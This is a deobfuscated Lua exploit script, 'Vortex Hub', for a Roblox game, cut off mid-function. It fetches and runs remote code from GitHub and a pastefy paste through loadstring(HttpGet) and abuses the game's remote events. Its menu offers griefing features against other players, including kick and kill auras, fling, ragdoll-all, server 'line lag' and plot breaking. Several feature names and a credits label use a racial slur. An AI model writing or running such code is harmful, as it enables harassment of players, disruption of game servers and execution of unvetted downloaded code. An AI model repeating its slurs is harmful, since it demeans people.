-- This File Deobfuscated Hunter 10000.0
local tbl, v, v2, v3, v4, v5, v6, lib, lib2, lib3, getPlayerCharacter, getCharacter, plcf, hrp_, charrrrrr, ros, lookAt, cnwoshipoPl, getLocalCharAndHum, now
local library, options, toggles, obj, fn, use, furtherReachBoughtNotifier, struggle, gameCorrectionsNotify, ragdollRemote, createGrabLine, destroyGrabLine, setNetworkOwner, extendGrabLine, menuToys, buyToyRemoteFunction, spawnToyRemoteFunction, destroyToy, stickyPartEvent, updateLineColorsEvent
local bombExplode_, localPlayer, map, v7, v8, playerGui, inOwnedPlot, inPlot, canSpawnToy, plotItems, playerScripts, characterAndBeamMove, isHeld_, stickyPartsTouchDetection, fn2, screenGui, imageButton, imageLabel, screenGui2, imageButton2
local imageLabel2, screenGui3, imageButton3, imageLabel3, fn3, fn4, tbl2, fn5, fn6, fn7, fn8, fn9, fn10, fn11, fn12, fn13, fn14, v9, tbl3, Avatar
local v10, v11, Camera_, Main, Extra, v12, v13, v14, v15, v16, v17, OwnerShip, Grab, loop, Bring, Blobman, v18, v19, Fling, v20
local v21, Settings, v22, v23, v24, Players_, Misc, keybinds, Auras, KickAura, v25, Tractor, v26, v27, v28, v29, v30, v31, v32, v33
local v34, v35, Developer, Menu, v36, Workspace, ReplicatedStorage, tbl4, tbl5, tbl6, v37, connection, fn15, fn16, fn17, tbl7, fn18, fn19, fn20, str
local fn21, fn22, fn23, fn24, fn25, fn26, fn27, fn28, fn29, fn30, fn31, createBodyPosition, fn32, v38, v39, Players_2, TextChatService, ReplicatedStorage2, TweenService, RunService_
local Lighting, SoundService, localPlayer2, tbl8, tbl9, tbl10, fn33, fn34, fn35, fn36, fn37, fn38, fn39, v40, v41, v42, v43, v44, v45, n
n = 1

while true do
    if n == 1 then
        tbl = {
            s = {
                type = type,
                tostring = tostring,
                pairs = pairs,
                pcall = pcall,
                print = print,
                error = error,
            },
            e = function()
                if not getgenv or not getgenv() then
                    return false
                end
                local flag = getgenv() == getgenv()
                return flag
            end,
        }

        tbl.f = function()
            for k, v46 in pairs(tbl.s) do
                if _G[k] and _G[k] ~= v46 then
                    return false
                end
            end

            return true
        end

        tbl.d = function()
            if not debug or not debug.getinfo then
                return true
            end
            local ok, result = pcall(debug.getinfo, 1)
            local v46 = ok and result
            return v46
        end

        tbl.v = function()
            local tbl11 = {A = "1", B = "2", C = "3"}

            for k, v46 in pairs(tbl11) do
                if tbl11[k] ~= v46 then
                    return false
                end
            end

            return true
        end

        v, v2, v3 = pairs({tbl.e, tbl.f, tbl.d, tbl.v})
        v4 = v3
        n = 2
    elseif n == 2 then
        v5, v6 = v(v2, v4)

        if v5 == nil then
            n = 5
        else
            n = 3
        end
    elseif n == 3 then
        v4 = v5

        if v6() then
            n = 2
        else
            n = 4
        end
    elseif n == 4 then
        task.wait()
        n = 4
    elseif n == 5 then
        loadstring(game:HttpGet("https://raw.githubusercontent.com/qvdc/Modified-Obsidian/main/Library.lua"))()
        lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/qvdc/Modified-Obsidian/main/addons/ThemeManager.lua"))()
        lib2 = loadstring(game:HttpGet("https://raw.githubusercontent.com/qvdc/Modified-Obsidian/main/addons/SaveManager.lua"))()
        lib3 = loadstring(game:HttpGet("https://pastefy.app/FJWfrz0i/raw"))()
        getPlayerCharacter = lib3.GetPlayerCharacter
        getCharacter = lib3.GetCharacter
        plcf = lib3.PLCF
        hrp_ = lib3.HRP
        charrrrrr = lib3.Charrrrrr
        ros = lib3.ROS
        lookAt = lib3.lookAt
        cnwoshipoPl = lib3.CNWOSHIPOPl
        getLocalCharAndHum = lib3.GetLocalCharAndHum
        ros = lib3.ROS
        now = tick()
        library = getgenv().Library
        options = library.Options
        toggles = library.Toggles

        obj = setmetatable({}, {
            __index = function(arg, arg2)
                local service = game:GetService(arg2)
                rawset(arg, arg2, service)
                return service
            end,
        })

        fn = function(arg)
            library:Notify({Title = "Vortex HUB", Description = arg, Duration = 4})
        end

        wait(2)

        PLOT_MAP = {
            ["Purple-Plot"] = "Plot3",
            ["Red-Plot"] = "Plot2",
            ["Green-Plot"] = "Plot1",
            ["Blue-Plot"] = "Plot4",
            ["Chinese-Plot"] = "Plot5",
        }

        use = obj.ReplicatedStorage.HoldEvents:WaitForChild("Use")
        UseRemote = use
        furtherReachBoughtNotifier = obj.ReplicatedStorage.GamepassEvents:WaitForChild("FurtherReachBoughtNotifier")
        FurtherReachBoughtNotifier = furtherReachBoughtNotifier
        struggle = obj.ReplicatedStorage.CharacterEvents:WaitForChild("Struggle")
        Struggle = struggle
        gameCorrectionsNotify = obj.ReplicatedStorage.GameCorrectionEvents:WaitForChild("GameCorrectionsNotify")
        GameCorrectionsNotify = gameCorrectionsNotify
        ragdollRemote = obj.ReplicatedStorage.CharacterEvents:WaitForChild("RagdollRemote")
        RagdollRemote = ragdollRemote
        createGrabLine = obj.ReplicatedStorage.GrabEvents:WaitForChild("CreateGrabLine")
        CreateGrabLine = createGrabLine
        destroyGrabLine = obj.ReplicatedStorage.GrabEvents:WaitForChild("DestroyGrabLine")
        DestroyGrabLine = destroyGrabLine
        setNetworkOwner = obj.ReplicatedStorage.GrabEvents:WaitForChild("SetNetworkOwner")
        SetNetworkOwner = setNetworkOwner
        extendGrabLine = obj.ReplicatedStorage.GrabEvents:WaitForChild("ExtendGrabLine")
        ExtendGrabLine = extendGrabLine
        menuToys = obj.ReplicatedStorage:WaitForChild("MenuToys")
        MenuToys = menuToys
        buyToyRemoteFunction = MenuToys:WaitForChild("BuyToyRemoteFunction")
        BuyToyRemoteFunction = buyToyRemoteFunction
        spawnToyRemoteFunction = obj.ReplicatedStorage.MenuToys:WaitForChild("SpawnToyRemoteFunction")
        SpawnToyRemoteFunction = spawnToyRemoteFunction
        destroyToy = MenuToys:WaitForChild("DestroyToy")
        DestroyToy = destroyToy
        stickyPartEvent = obj.ReplicatedStorage.PlayerEvents:WaitForChild("StickyPartEvent")
        StickyPartEvent = stickyPartEvent
        updateLineColorsEvent = obj.ReplicatedStorage.DataEvents:WaitForChild("UpdateLineColorsEvent")
        UpdateLineColorsEvent = updateLineColorsEvent
        bombExplode_ = obj.ReplicatedStorage.BombEvents:WaitForChild("BombExplode")
        bombExplode = bombExplode_
        originalFallenHeight = obj.Workspace.FallenPartsDestroyHeight
        Camera = obj.Workspace.CurrentCamera
        localPlayer = obj.Players.LocalPlayer
        map = obj.Workspace:FindFirstChild("Map")
        Map = map
        v7 = obj.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
        SpawnedInToys = v7
        v8 = obj.Workspace:FindFirstChild(localPlayer.Name .. "SpawnedInToys")

        if v8 then
            n = 7
        else
            n = 6
        end
    elseif n == 6 then
        v8 = obj.Workspace:WaitForChild(localPlayer.Name .. "SpawnedInToys")
        n = 7
    elseif n == 7 then
        playerGui = localPlayer:WaitForChild("PlayerGui")
        PlayerGui = playerGui
        inOwnedPlot = localPlayer:WaitForChild("InOwnedPlot")
        InOwnedPlot = inOwnedPlot
        inPlot = localPlayer:WaitForChild("InPlot")
        InPlot = inPlot
        canSpawnToy = localPlayer:WaitForChild("CanSpawnToy")
        CanSpawnToy = canSpawnToy
        plotItems = obj.Workspace:FindFirstChild("PlotItems")
        PlotItems = plotItems
        playerScripts = localPlayer:WaitForChild("PlayerScripts")
        PlayerScripts = playerScripts
        characterAndBeamMove = PlayerScripts:WaitForChild("CharacterAndBeamMove")
        CharacterAndBeamMove = characterAndBeamMove
        isHeld_ = localPlayer:WaitForChild("IsHeld")
        isHeld = isHeld_
        stickyPartsTouchDetection = PlayerScripts:WaitForChild("StickyPartsTouchDetection")
        AntiShuriLag = stickyPartsTouchDetection

        fn2 = function(arg)
            SetNetworkOwner:FireServer(arg, arg.CFrame)
        end

        screenGui = Instance.new("ScreenGui")
        screenGui.Name = "BringGui"
        screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screenGui.ResetOnSpawn = false
        screenGui:SetAttribute("IsCustomScriptGui", true)
        screenGui.Parent = PlayerGui
        imageButton = Instance.new("ImageButton")
        imageButton.Name = "BringButton"
        imageButton.Parent = screenGui
        imageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        imageButton.BackgroundTransparency = 1
        imageButton.BorderSizePixel = 0
        imageButton.Position = UDim2.new(1, -449, 1, -80)
        imageButton.Size = UDim2.new(0, 50, 0, 50)
        imageButton.Image = "rbxassetid://97166444"
        imageButton.ImageColor3 = Color3.fromRGB(142, 142, 142)
        imageButton.ImageTransparency = 0.2
        imageLabel = Instance.new("ImageLabel")
        imageLabel.Name = "BringLabel"
        imageLabel.Parent = imageButton
        imageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        imageLabel.BackgroundTransparency = 1
        imageLabel.BorderSizePixel = 0
        imageLabel.Position = UDim2.new(0.12, 0, 0.16, 0)
        imageLabel.Size = UDim2.new(0.7, 0, 0.62, 2)
        imageLabel.Image = "rbxassetid://130703864968637"
        imageLabel.Visible = false
        screenGui2 = Instance.new("ScreenGui")
        screenGui2.Name = "TpGui"
        screenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screenGui2.ResetOnSpawn = false
        screenGui2:SetAttribute("IsCustomScriptGui", true)
        screenGui2.Parent = PlayerGui
        imageButton2 = Instance.new("ImageButton")
        imageButton2.Name = "TpButton"
        imageButton2.Parent = screenGui2
        imageButton2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        imageButton2.BackgroundTransparency = 1
        imageButton2.BorderSizePixel = 0
        imageButton2.Position = UDim2.new(1, -325, 1, -80)
        imageButton2.Size = UDim2.new(0, 50, 0, 50)
        imageButton2.Image = "rbxassetid://97166444"
        imageButton2.ImageTransparency = 0.2
        imageLabel2 = Instance.new("ImageLabel")
        imageLabel2.Name = "TpLabel"
        imageLabel2.Parent = imageButton2
        imageLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        imageLabel2.BackgroundTransparency = 1
        imageLabel2.BorderSizePixel = 0
        imageLabel2.Size = UDim2.new(1, 0, 1, 0)
        imageLabel2.Image = "rbxassetid://126631801334895"
        imageLabel2.Visible = false
        screenGui3 = Instance.new("ScreenGui")
        screenGui3.Name = "PalletGui"
        screenGui3.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        screenGui3.ResetOnSpawn = false
        screenGui3:SetAttribute("IsCustomScriptGui", true)
        screenGui3.Parent = PlayerGui
        imageButton3 = Instance.new("ImageButton")
        imageButton3.Name = "PalletButton"
        imageButton3.Parent = screenGui3
        imageButton3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        imageButton3.BackgroundTransparency = 1
        imageButton3.BorderSizePixel = 0
        imageButton3.Position = UDim2.new(1, -387, 1, -80)
        imageButton3.Size = UDim2.new(0, 50, 0, 50)
        imageButton3.Image = "rbxassetid://97166444"
        imageButton3.ImageColor3 = Color3.fromRGB(142, 142, 142)
        imageButton3.ImageTransparency = 0.2
        imageLabel3 = Instance.new("ImageLabel")
        imageLabel3.Name = "PalletLabel"
        imageLabel3.Parent = imageButton3
        imageLabel3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
        imageLabel3.BackgroundTransparency = 1
        imageLabel3.BorderSizePixel = 0
        imageLabel3.Position = UDim2.new(0.03, 0, 0, 0)
        imageLabel3.Size = UDim2.new(0.93, 0, 1, 2)
        imageLabel3.Image = "rbxassetid://77142072031982"

        fn3 = function(arg, arg2, arg3)
            local v46 = arg:FindFirstChild(arg2)
            local v47 = v46

            if not v46 then
                local waitForChild = arg.WaitForChild
                local n2 = arg3 or 3
                v47 = waitForChild(arg, arg2, n2)
            end

            return v47
        end

        fn4 = function(arg, arg2, arg3)
            local v46 = SpawnedInToys
            local v47 = SpawnToyRemoteFunction
            local invokeServer = v47.InvokeServer
            local unpack_ = table.unpack
            local tbl11 = {arg, arg2}
            local vector = arg3 or Vector3.zero
            tbl11[3] = vector
            invokeServer(v47, unpack_(tbl11))
            local v48 = v46 and v46[arg]
            return v48
        end

        tbl2 = {}
        tbl2.walkSpeed = 5
        tbl2.jumpPower = 24
        tbl2.spiderT = false
        tbl2.climbSpeed = 20
        tbl2.spiderCon = nil
        tbl2.fov = 70
        tbl2.deffov = 70
        tbl2.jumpConnection = nil
        tbl2.walkSpeedToggle = false
        tbl2.infiniteJumpToggle = false
        tbl2.fovToggle = false
        tbl2.spincconnn = nil
        tbl2.spinsp = 5
        tbl2.noclip = false
        tbl2.NoclipConnection = nil
        tbl2.kunaiMonitorConn = nil
        tbl2.AntigrabCon = nil
        tbl2.AntiGrabRag = false
        tbl2.AntigrabRGProc = false
        tbl2.AntigrabragWalk = false
        tbl2.AntigrabTPT = false
        tbl2.gucciRunId = 0
        tbl2.runId = 0
        tbl2.active = false
        tbl2.ragdollLoopActive = false
        tbl2.ragdollTask = nil
        tbl2.permRagActive = false
        tbl2.permRagTask = nil
        tbl2.setupDone = false
        tbl2.seatOccupied = false
        tbl2.monitoring = false
        tbl2.blobRef = nil
        tbl2.remoteRef = nil
        tbl2.tractorGucciT = false
        tbl2.tractorGucci2 = nil
        tbl2.tractorGucci3 = false
        tbl2.tractorGucci4 = nil
        tbl2.tractorGucci5 = {}
        tbl2.autoatakka = false
        tbl2.AutoAttackerToggle = nil
        tbl2.SelectAutoatakka = "Death"
        tbl2.autoBlobSitT = false
        tbl2.antiBlobKillActive = false
        tbl2.autoBlobSitTask = nil
        tbl2.antiBlobmanKillTask = nil
        tbl2.Blobkilltest = false
        tbl2.AntiblobauraCon = nil
        tbl2.BlobkilltestCon = nil
        tbl2.AntikillHouseT = false
        tbl2.AntiKillHouseCon = nil
        tbl2.antiKillHousePos = Vector3.new(-544.836304, -7.35040474, 77.8825378)
        tbl2.IsBypassRun = false
        tbl2.lastOriginalCFrame = nil
        tbl2.cameraTargetPart = nil
        tbl2.antibananaSit = false
        tbl2.AntiragdollToggle = false
        tbl2.connections = {}
        tbl2.charAddedConn = nil
        tbl2.AntiRagBlob = false
        tbl2.BlobRagdollSit = false
        tbl2.Antbananadest = false
        tbl2.Bananans = {}
        tbl2.AntiBananaCon = {}
        tbl2.paintPartsBackup = {}
        tbl2.paintConnections = {}
        tbl2.playerTag = nil
        tbl2.targetToy = "InstrumentGuitarBanjo"
        tbl2.loopActive = false
        tbl2.runLoop = nil
        tbl2.respawnHandler = nil
        tbl2.spawnToyRemote = nil
        tbl2.destroyToyRemote = nil
        tbl2.CountLines = 0
        tbl2.LastLagS = nil
        tbl2.AutoAntiLag = false
        tbl2.AntiBurnndada = nil
        tbl2.AntiExplosionActive = false
        tbl2.AntiExplosionConnection = nil
        tbl2.antiStickyToggle = false
        tbl2.AutoTurnOnAntiKick = false
        tbl2.Contuuti = {}
        tbl2.kickitemToggle = false
        tbl2.kickitemPCLD = nil
        tbl2.kickitemPCLDcon = nil
        tbl2.AntiKickToggle = false
        tbl2.AntikickT = false
        tbl2.AntikickResetToggle = false
        tbl2.AntikickLeaveToggle = false
        tbl2.PlayerListAnti = {}
        tbl2.TargetAntigrabtpT = false
        tbl2.tpmode = "Grab"
        tbl2.tpDrop = nil
        tbl2.PCLDBOX = {}
        tbl2.PCLDToggle = false
        tbl2.blackHoleESP = false
        tbl2.BlackholeSelectionB = {}
        tbl2.BlackholeBeam = {}
        tbl2.BlackHoleConnection = nil
        tbl2.PCLDLine = Color3.fromRGB(0, 255, 255)
        tbl2.PCLDSurface = Color3.fromRGB(0, 100, 255)
        tbl2.PCLDFill = Color3.fromRGB(0, 0, 255)
        tbl2.byte_thres = 5120
        tbl2.PacketCooldown = 30
        tbl2.lastPacketNotify = 0
        tbl2.PacketCon = {}
        tbl2.JoinNotify = false
        tbl2.LeaveNotify = false
        tbl2.KickNotify = false
        tbl2.RecentKicked = {}
        tbl2.KickConnection = nil
        tbl2.ClickTPKey = Enum.KeyCode.Z
        tbl2.BringKey = Enum.KeyCode.G
        tbl2.ClickTPfutuu = false
        tbl2.TPMode = "ClickTP"
        tbl2.TPZcon = nil
        tbl2.TPZconall = nil
        tbl2.TPZholdCn = nil
        tbl2.holdtoggletp = false
        tbl2.TPZContro = nil
        tbl2.MobileTPDownCon = nil
        tbl2.MobileTPUpCon = nil
        tbl2.MobileTPLeaveCon = nil
        tbl2.MobileTPClickCon = nil
        tbl2.palletConn = nil
        tbl2.auraRadius = 600
        tbl2.SitAuraToggle = false
        tbl2.SitauraConnection = nil
        tbl2.auraThread = nil
        tbl2.spinSpeed = 150
        tbl2.spinAuraToggle = false
        tbl2.spinConnection = nil
        tbl2.TeleportAuraT = false
        tbl2.teleportBodie = {}
        tbl2.teleportGyro = {}
        tbl2.teleportCoro = nil
        tbl2.RagdollAuraToggle = false
        tbl2.BringAura = false
        tbl2.deathAuraToggle = false
        tbl2.deathConnection = nil
        tbl2.WhitelistFriends = false
        tbl2.spamkickaura = false
        tbl2.spamkickauralag = false
        tbl2.DoRagdoll = true
        tbl2.UsePallete = true
        tbl2.WhitelistFriends = false
        tbl2.LineLagEnabled = true
        tbl2.PStickyToggle = false
        tbl2.speedTractor = false
        tbl2.nitroActive = false
        tbl2.FireAllT = false
        tbl2.FireallWhitelist = true
        tbl2.RagdollAllT = false
        tbl2.RagdollallWhitelist = true
        tbl2.NiggerAllT = false
        tbl2.NiggerWhiteList = true
        tbl2.Killall = false
        tbl2.Kiclall = false
        tbl2.BringAllToggle = false
        tbl2.gewgsgvwe = true
        tbl2.floatConnection = nil
        tbl2.cameraAnchor = nil
        tbl2.originalCameraSubject = nil
        tbl2.freezePart = nil
        tbl2.WhitelistFriends2 = true
        tbl2.oopkillblob = false
        tbl2.PlayerList = {}
        tbl2.aa6 = false
        tbl2.aa7 = nil
        tbl2.aa9 = 25
        tbl2.aa13 = false
        tbl2.aa15 = nil
        tbl2.aa17 = false
        tbl2.aa73 = nil
        tbl2.running = false
        tbl2.LastHouse = nil
        tbl2.LastPlotOwner = nil
        tbl2.HeightLimit = 10000
        tbl2.SpamkickblT = false
        tbl2.A1B2 = nil
        tbl2.C3D4 = nil
        tbl2.E5F6 = nil
        tbl2.G7H8 = nil
        tbl2.I9J0 = nil
        tbl2.BringMode = "GRAB"
        tbl2.Loopkillblob = false
        tbl2.TarAntiAntikickWD = false
        tbl2.TarAntikickRoot = nil
        tbl2.FireLoop = false
        tbl2.BananaLoop = false
        tbl2.niggerLoop = false
        tbl2.PenKillT = false
        tbl2.PenKillTask = nil
        tbl2.LoopKillToggle = false
        tbl2.LoopKillTask = nil
        tbl2.blobAllT = false
        tbl2.Bloballmode = "Kill"
        tbl2.bloballrun = false
        tbl2.bloballWhite = false
        tbl2.bloballWhitePlr = {}
        tbl2.WhitelistFriendsBLOB = false
        tbl2.BlobauraM = "Kill"
        tbl2.BlobauraT = false
        tbl2.BlobauraR = false
        tbl2.WalkspeedCont = 16
        tbl2.JumpPownerCont = 50
        tbl2.BLkickallWhite = false
        tbl2.BLKickallHeight = 14
        tbl2.BLSpreadRadius = 25
        tbl2.LineLagCoro = nil
        tbl2.LineLagToggle = false
        tbl2.WhitelistKickall = false
        tbl2.KickallHeight = 14
        tbl2.kickallRadius = 16
        tbl2.lineLagkickall = nil
        tbl2.lineLagConkickall = false
        tbl2.SelectedPlot = {"Purple-Plot"}
        tbl2.plotBreakToggle = false
        tbl2.BleakPlotShuriken = {}
        tbl2.savedPosition = nil
        tbl2.isTeleported = false
        tbl2.HouseTPauto = false
        tbl2.GameName = game.Name
        tbl2.Frames = 0
        tbl2.serverHopRejoin = 0

        fn5 = function()
            local plots = obj.Workspace:FindFirstChild("Plots")
            if not plots then
                return
            end
            local v46 = PLOT_MAP[tbl2.SelectedPlot]
            if not v46 then
                return
            end
            return plots:FindFirstChild(v46)
        end

        fn6 = function(arg)
            local inPlot2 = arg:FindFirstChild("InPlot")
            local value = inPlot2 and arg.InPlot.Value
            return value
        end

        fn7 = function(arg)
            if not arg or arg == localPlayer then
                return false
            end

            if not arg.Character then
                return false
            end

            if tbl2.WhitelistFriends and localPlayer:IsFriendsWith(arg.UserId) then
                return false
            end
            local find = table.find
            local v46 = kickAuraWhitelist
            local tbl11 = v46 or {}
            if find(tbl11, arg.Name) then
                return false
            end
            local humanoid = arg.Character:FindFirstChildOfClass("Humanoid")
            local flag = humanoid and humanoid.Health > 0
            return flag
        end

        fn8 = function(arg)
            if not tbl2.FireallWhitelist then
                return false
            end

            if not arg or not arg.UserId or not localPlayer then
                return false
            end
            local flag = false

            pcall(function()
                flag = localPlayer:IsFriendsWith(arg.UserId)
            end)

            if not flag then
                return false
            end
            return true
        end

        fn9 = function(arg)
            if not tbl2.RagdollallWhitelist then
                return false
            end

            if not arg or not arg.UserId or not localPlayer then
                return false
            end
            local flag = false

            pcall(function()
                flag = localPlayer:IsFriendsWith(arg.UserId)
            end)

            if not flag then
                return false
            end
            return true
        end

        fn10 = function(arg)
            if not tbl2.NiggerWhiteList then
                return false
            end

            if not arg or not arg.UserId or not localPlayer then
                return false
            end
            local flag = false

            pcall(function()
                flag = localPlayer:IsFriendsWith(arg.UserId)
            end)

            if not flag then
                return false
            end
            return true
        end

        fn11 = function(arg)
            if arg == localPlayer then
                return true
            end

            if not tbl2.gewgsgvwe then
                return false
            end

            local ok, result = pcall(function()
                return localPlayer:IsFriendsWith(arg.UserId)
            end)

            if ok and result then
                return true
            end
            return false
        end

        fn12 = function(arg)
            if not tbl2.bloballWhite then
                return false
            end

            if arg == localPlayer then
                return true
            end

            if localPlayer:IsFriendsWith(arg.UserId) then
                return true
            end

            if not tbl2.bloballWhitePlr[arg.Name] then
                return false
            end
            return true
        end

        fn13 = function(arg)
            if not tbl2.WhitelistFriendsBLOB then
                return false
            end

            if not arg or not arg.UserId then
                return false
            end

            if arg == localPlayer then
                return true
            end
            return localPlayer:IsFriendsWith(arg.UserId)
        end

        isTargetable = function(arg)
            if not arg or arg == localPlayer then
                return false
            end

            if tbl2.WhitelistKickall then
                local flag = false

                pcall(function()
                    flag = localPlayer:IsFriendsWith(arg.UserId)
                end)

                if flag then
                    return false
                end
            end

            return true
        end

        fn14 = function(arg, arg2)
            if not arg or arg == localPlayer then
                return
            end

            if arg2 == "Join" and tbl2.JoinNotify then
                library:Notify({
                    Title = "Joined",
                    Description = string.format("%s (ID:%s) joined the game.", arg.DisplayName, arg.Name),
                    Duration = 5,
                })
            elseif arg2 == "Leave" and tbl2.LeaveNotify then
                if tbl2.RecentKicked[arg] then
                    tbl2.RecentKicked[arg] = nil
                    return
                end

                if obj.Workspace:FindFirstChild("BlackHoleKick") or arg.Character and arg.Character:FindFirstChild("BlackHoleKick") then
                    return
                end

                library:Notify({
                    Title = "Left",
                    Description = string.format("%s (ID:%s) left the game.", arg.DisplayName, arg.Name),
                    Duration = 5,
                })
            elseif arg2 == "Kick" and tbl2.KickNotify then
                tbl2.RecentKicked[arg] = true

                library:Notify({
                    Title = "Kicked",
                    Description = string.format("%s (ID:%s) has been kicked!", arg.DisplayName, arg.Name),
                    Duration = 5,
                })

                task.delay(10, function()
                    tbl2.RecentKicked[arg] = nil
                end)
            end
        end

        obj.Players.PlayerAdded:Connect(function(player)
            fn14(player, "Join")
        end)

        obj.Players.PlayerRemoving:Connect(function(player)
            fn14(player, "Leave")
        end)

        pcall(function()
            local productInfo = obj.MarketplaceService:GetProductInfo(game.PlaceId)

            if productInfo and productInfo.Name then
                tbl2.GameName = productInfo.Name
            end
        end)

        v9 = library:CreateWindow({
            Title = "Vortex Hub",
            Footer = "Project Vortex HUB | FTAP",
            Icon = 13639308918,
            NotifySide = "Right",
            ShowCustomCursor = true,
            EnableCompacting = true,
            SidebarCompacted = true,
            SearchbarSize = UDim2.fromScale(0.45, 1),
            CornerRadius = 30,
        })

        lib:SetLibrary(library)

        lib:SetDefaultTheme({
            BackgroundColor = Color3.fromRGB(0, 0, 0),
            AccentColor = Color3.fromRGB(126, 126, 126),
            OutlineColor = Color3.fromRGB(30, 30, 30),
            FontColor = Color3.fromRGB(174, 174, 174),
            FontFace = "BuilderSans",
        })

        tbl3 = {
            infoTab = v9:AddTab("Info", "info"),
            PlayerTab = v9:AddTab("Local Player", "person-standing"),
            AntiTab = v9:AddTab("Defense", "shield"),
            Target = v9:AddTab("Target", "target"),
            BlobmanTab = v9:AddTab("Blobman", "skull"),
            ESPTab = v9:AddTab("ESP", "eye"),
            NotifyTab = v9:AddTab("Notify", "bell"),
            Keybinds = v9:AddTab("keybinds", "keyboard"),
            AuraTab = v9:AddTab("Aura", "sparkles"),
            MiscTab = v9:AddTab("Misc", "package"),
            ServerTab = v9:AddTab("Server", "server"),
            CreditsTab = v9:AddTab("Credits", "users"),
            UISettings = v9:AddTab("UISettings", "settings"),
        }

        Avatar = tbl3.infoTab:AddLeftGroupbox("Avatar")
        v10 = tbl3.infoTab:AddRightGroupbox("local Info / Game Info")
        v11 = tbl3.infoTab:AddRightGroupbox("Rejoin / Join")
        Camera_ = tbl3.PlayerTab:AddLeftGroupbox("Camera")
        Main = tbl3.PlayerTab:AddLeftGroupbox("Main")
        Extra = tbl3.PlayerTab:AddRightGroupbox("Extra")
        v12 = tbl3.PlayerTab:AddLeftGroupbox("Fake Korblox")
        v13 = tbl3.AntiTab:AddLeftGroupbox("Main Defense")
        v14 = tbl3.AntiTab:AddRightGroupbox("Extra Defense")
        v15 = tbl3.AntiTab:AddLeftGroupbox("Target Defense")
        v16 = tbl3.AntiTab:AddRightGroupbox("Anti Kick")
        v17 = tbl3.Target:AddLeftGroupbox("Selct Target")
        OwnerShip = tbl3.Target:AddLeftGroupbox("OwnerShip")
        Grab = tbl3.Target:AddLeftGroupbox("Grab")
        loop = tbl3.Target:AddLeftGroupbox("LOOP")
        Bring = tbl3.Target:AddRightGroupbox("Bring")
        Blobman = tbl3.Target:AddLeftGroupbox("Blobman")
        v18 = tbl3.Target:AddRightGroupbox("Destroy Gucci")
        v19 = tbl3.Target:AddLeftGroupbox("Remove Anti-Kick")
        Fling = tbl3.Target:AddRightGroupbox("Fling")
        v20 = tbl3.BlobmanTab:AddLeftGroupbox("Blobman All")
        v21 = tbl3.BlobmanTab:AddLeftGroupbox("Blobman Aura")
        Settings = tbl3.BlobmanTab:AddRightGroupbox("Settings")
        v22 = tbl3.ESPTab:AddLeftGroupbox("Anti-Kick ESP")
        v23 = tbl3.ESPTab:AddRightGroupbox("Player Character Location Detector")
        v24 = tbl3.ESPTab:AddRightGroupbox("Black Hole")
        Players_ = tbl3.NotifyTab:AddLeftGroupbox("Players")
        Misc = tbl3.NotifyTab:AddRightGroupbox("Misc")
        keybinds = tbl3.Keybinds:AddLeftGroupbox("keybinds")
        Auras = tbl3.AuraTab:AddLeftGroupbox("Auras")
        KickAura = tbl3.AuraTab:AddRightGroupbox("KickAura")
        v25 = tbl3.MiscTab:AddRightGroupbox("Pallet Sticky")
        Tractor = tbl3.MiscTab:AddLeftGroupbox("Tractor")
        v26 = tbl3.MiscTab:AddRightGroupbox("Break Barrier")
        v27 = tbl3.MiscTab:AddLeftGroupbox("Fire All")
        v28 = tbl3.MiscTab:AddRightGroupbox("Banana All")
        v29 = tbl3.MiscTab:AddLeftGroupbox("Nigger All")
        v30 = tbl3.MiscTab:AddRightGroupbox("Bring All")
        v31 = tbl3.ServerTab:AddLeftGroupbox("Line Lag")
        v32 = tbl3.ServerTab:AddLeftGroupbox("Ground Kick")
        v33 = tbl3.ServerTab:AddRightGroupbox("Blob Kickall")
        v34 = tbl3.ServerTab:AddLeftGroupbox("Plot Break")
        v35 = tbl3.ServerTab:AddLeftGroupbox("Claim-Plot")
        Developer = tbl3.CreditsTab:AddLeftGroupbox("Developer", "https://cdn.phototourl.com/free/2026-09-10-5c4f8876-4b73-4199-bee4-989287ed6aad.png")
        tbl3.CreditsTab:AddLeftGroupbox("Nigger")
        tbl3.CreditsTab:AddRightGroupbox("Discord (test)", "https://cdn.phototourl.com/free/2026-09-10-6aece83a-8053-4537-8650-e70b237a854e.png")
        Menu = tbl3.UISettings:AddLeftGroupbox("Menu")

        Avatar:AddViewport("MyViewport", {
            Object = localPlayer.Character,
            Height = 300,
            Interactive = true,
            AutoFocus = true,
        })

        v36 = v10:AddLabel("FPS: 0 | Ping: 0ms")

        v10:AddLabel({
            Text = string.format("%s (ID: %s)", localPlayer.DisplayName, localPlayer.Name),
            Icon = "user",
        })

        v10:AddLabel({
            Text = string.format("%s (ID: %s)", tbl2.GameName, game.PlaceId),
            Icon = "gamepad-2",
        })

        v11:AddButton({
            Text = "Rejoin",
            Func = function()
                if tbl2.serverHopRejoin == 0 then
                    tbl2.serverHopRejoin = 1
                    fn("Do you want to rejoin the game?")
                elseif tbl2.serverHopRejoin == 1 then
                    tbl2.serverHopRejoin = 2
                    fn("If you really want to rejoin, please press the button again.")
                elseif tbl2.serverHopRejoin == 2 then
                    tbl2.serverHopRejoin = 0

                    pcall(function()
                        obj.TeleportService:Teleport(game.PlaceId, obj.Players.LocalPlayer)
                    end)
                end
            end,
        })

        v11:AddButton({
            Text = "Server Hop",
            Func = function()
                if tbl2.serverHopRejoin == 0 then
                    tbl2.serverHopRejoin = 1
                    fn("Do you want to hop to another server?")
                elseif tbl2.serverHopRejoin == 1 then
                    tbl2.serverHopRejoin = 2
                    fn("If you really want to hop servers, please press the button again.")
                elseif tbl2.serverHopRejoin == 2 then
                    tbl2.serverHopRejoin = 0

                    pcall(function()
                        local placeId = game.PlaceId
                        local jobId = game.JobId
                        local data = obj.HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/places/" .. placeId .. "/servers/0?sortOrder=Asc&limit=100"))
                        local id = nil

                        if data and data.data then
                            for i, v46 in ipairs(data.data) do
                                if v46.id ~= jobId and v46.playing < v46.maxPlayers then
                                    id = v46.id
                                    break
                                end
                            end
                        end

                        if id then
